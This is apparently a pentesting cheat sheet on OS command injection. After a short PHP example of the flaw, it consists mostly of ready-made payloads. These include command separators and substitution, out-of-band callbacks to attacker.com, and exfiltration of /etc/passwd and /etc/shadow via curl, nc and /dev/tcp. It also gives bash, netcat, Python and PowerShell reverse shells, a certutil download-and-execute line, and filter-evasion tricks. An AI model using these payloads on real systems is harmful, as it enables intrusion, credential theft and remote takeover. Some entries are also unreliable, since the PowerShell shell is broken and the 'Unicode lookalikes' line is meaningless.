# Command Injection

**Command Injection** is a web security vulnerability  that allows an attacker to execute arbitrary system commands on the host operating system. This vulnerability occurs when an application passes  unsafe user supplied data to a system shell.

Command injection occurs when an application executes system commands that  include user-supplied data without proper sanitization. For example, in  the code:

```php
<?php $cmd = 'ping -c 4 ' . $_GET['host'];system($cmd);?>
```

An attacker might input: `8.8.8.8; ls -la`, changing the command to:

```bash
ping -c 4 8.8.8.8; ls -la
```

This executes both the ping command and lists directory contents.

---

## Tools

| Tool                                                         | Description                      | Primary Use Case                 |
| ------------------------------------------------------------ | -------------------------------- | -------------------------------- |
| [Commix](https://github.com/commixproject/commix)            | Automated command injection tool | Discovery and exploitation       |
| Burp Suite                                                   | Web vulnerability scanner        | Traffic interception and testing |
| NetCat                                                       | Network utility                  | Reverse shell handling           |
| Metasploit                                                   | Exploitation framework           | Advanced payload delivery        |
| [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) | PowerShell post-exploitation     | Windows command execution        |

---

## Detection

### Manual Testing

#### Command Separator Tests

Used to chain multiple commands together. Tests if the application properly sanitizes command separators:

```bash
# Semicolon (;) - Command sequencing
command1;command2        # Executes commands sequentially
ping 127.0.0.1;id       # Executes ping, then id
echo test;whoami        # Outputs test, then username

# Ampersand (&) - Background processing
command1&command2       # Executes both commands in background
ping 127.0.0.1&dir     # Starts ping and immediately runs dir
whoami&hostname        # Runs both commands simultaneously

# Double Ampersand (&&) - Conditional execution
command1&&command2      # Executes command2 only if command1 succeeds
ping 127.0.0.1&&whoami # Runs whoami only if ping succeeds
cd /tmp&&ls -la        # Lists directory only if cd succeeds

# Pipe (|) - Output redirection
command1|command2      # Sends output of command1 to command2
whoami|tr a-z A-Z     # Converts username to uppercase
ls -la|grep root      # Lists files and filters for 'root'
```

#### Command Substitution Tests

Tests if the application allows command output to be used as input:

```bash
# Backtick (`) substitution
`command`             # Classic command substitution
echo `whoami`        # Outputs result of whoami
ping `hostname`      # Pings the result of hostname

# Dollar substitution
$(command)           # Modern command substitution
echo $(id)          # Outputs result of id
cat $(locate passwd) # Reads files found by locate

# Nested substitution
$(echo `whoami`)    # Nested classic in modern
`echo $(hostname)`  # Nested modern in classic
```

#### Newline Injection Tests

Tests if the application properly handles line breaks in commands:

```bash
# URL encoded newlines
command1%0acommand2  # %0a represents \n
ping%0aid           # Executes ping, then id on new line
whoami%0als         # Runs whoami, then ls

# Carriage return injection
command1%0dcommand2  # %0d represents \r
echo test%0dcat /etc/passwd  # Potentially bypasses filters
```

#### OS Detection Tests

Identifies target operating system using specific commands:

```bash
# Windows specific commands
ver                  # Shows Windows version
systeminfo          # Detailed system information
type C:\Windows\System32\drivers\etc\hosts  # Reads hosts file
net user            # Lists users
dir C:\             # Lists root directory

# Linux specific commands
uname -a            # Kernel and system information
cat /etc/issue      # Distribution information
cat /proc/version   # Kernel version information
lsb_release -a      # Distribution details
cat /etc/passwd     # User account information
```

#### Out-of-Band Tests

Tests command injection through external interaction detection:

```bash
# DNS based detection
nslookup uniquestring.attackerdomain.com  # Generates DNS lookup
ping uniquestring.attackerdomain.com      # ICMP based detection
dig uniquestring.attackerdomain.com       # DNS query tool

# HTTP based detection
wget http://attacker.com/uniquestring     # Generates HTTP GET
curl http://attacker.com/uniquestring     # Alternative HTTP request
powershell IEX(New-Object Net.WebClient).downloadString('http://attacker.com') # PowerShell web request
```

#### Time-Based Tests

Verifies command execution through time delays:

```bash
# Linux delay commands
ping -c 10 127.0.0.1    # 10 second delay using ping
sleep 10               # Direct delay command
perl -e "sleep 10"     # Perl based delay
python -c "import time; time.sleep(10)"  # Python delay

# Windows delay commands
ping -n 10 127.0.0.1   # Windows ping delay
timeout 10             # Windows timeout command
Start-Sleep -s 10      # PowerShell sleep
```

### Automated Discovery

#### Using Nuclei

To learn how to use Nuclei in detail, you can go to our related tactic page by [click here](https://hackviser.com/tactics/tools/nuclei).

```bash
# Run command injection templates
nuclei -u http://target.com -t cmd-injection/

# Run with custom templates
nuclei -u http://target.com -t custom-cmd.yaml

# Severity based scanning
nuclei -u http://target.com -t cmd-injection/ -severity critical,high
```

## Attack Vectors

### Direct Command Execution

Basic command injection techniques that directly execute commands:

```bash
# Linux commands
; cat /etc/passwd
; ls -la /
; id
; pwd

# Windows commands
& dir C:\
& type C:\Windows\System32\drivers\etc\hosts
& whoami
& net user
```

### Command Substitution

Using command substitution to execute commands and return output:

```bash
# Backtick syntax
`id`
`whoami`
`cat /etc/passwd`

# Dollar syntax
$(id)
$(whoami)
$(cat /etc/passwd)

# Nested execution
$(echo `whoami`)
`echo $(id)`
```

### Data Exfiltration

Methods to extract data from the system:

```bash
# File reading
$(cat /etc/passwd > /dev/tcp/attacker.com/4444)
; base64 /etc/shadow | curl -d @- http://attacker.com

# System enumeration
; find / -perm -4000 2>/dev/null
; netstat -an | nc attacker.com 4444
```

### Reverse Shell Payloads

#### Basic Reverse Shells

```bash
# Bash reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Netcat reverse shell
nc -e /bin/sh 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Windows Reverse Shells

```powershell
# PowerShell reverse shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Certutil download and execute
certutil -urlcache -split -f http://10.0.0.1/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe
```

## Bypass Techniques

### Blacklist Bypass

Used when specific commands or characters are blacklisted:

```bash
# Command obfuscation
w'h'o'am'i
w"h"o"am"i
\w\h\o\a\m\i

# Alternative commands
# Instead of: cat /etc/passwd
head /etc/passwd
tail /etc/passwd
less /etc/passwd
more /etc/passwd

# Character substitution
$(rev<<<'imaohw')  # whoami reversed
$(printf "whoami")
```

### Space Bypass

Used when spaces are filtered:

```bash
# IFS variable
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}

# Line feed/Tabs
cat</etc/passwd
cat$'\x20'/etc/passwd

# Brace expansion
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
```

### Environment Variable Bypass

Using environment variables to hide commands:

```bash
# Variable substitution
COMMAND=whoami
$COMMAND

# Base64 encoding
echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d|bash
export CMD="Y2F0IC9ldGMvcGFzc3dk";bash<<<$(base64 -d<<<$CMD)

# Hex encoding
bash<<<$(xxd -r -p<<<776863616D69)  # whoami in hex
```

### Path Bypass

Using different paths to execute commands:

```bash
# Absolute paths
/usr/bin/whoami
/bin/cat /etc/passwd

# Path variable manipulation
PATH=/usr/bin;cat /etc/passwd
PATH=$PATH:/usr/bin;whoami

# Binary locations
which ls|xargs /bin/ls
locate whoami|head -n1|xargs
```

### Filter Evasion

Advanced techniques to evade security filters:

```bash
# Command concatenation
'cat'</etc/passwd
"w"h"o"a"m"i

# Wildcard usage
/???/??t /??c/p??s??
/bin/c?t /etc/p?ssw?

# Using aliases
alias ls=whoami;ls

# Double encoding
$(echo -e "\x77\x68\x6f\x61\x6d\x69")  # whoami in hex
```

### Character Encoding Bypass

Different encoding methods to bypass filters:

```bash
# URL encoding
curl$IFS-X$IFS'GET'$IFS"http://attacker.com"

# Unicode encoding
㎈㎉㎊㎋㎌㎍㎎  # Using Unicode lookalikes

# HTML encoding
&#119;&#104;&#111;&#97;&#109;&#105;  # whoami in HTML entities
```

## Common Tools

| Tool        | Description                      | Primary Use Case                 |
| ----------- | -------------------------------- | -------------------------------- |
| Commix      | Automated command injection tool | Discovery and exploitation       |
| Burp Suite  | Web vulnerability scanner        | Traffic interception and testing |
| NetCat      | Network utility                  | Reverse shell handling           |
| Metasploit  | Exploitation framework           | Advanced payload delivery        |
| PowerSploit | PowerShell post-exploitation     | Windows command execution        |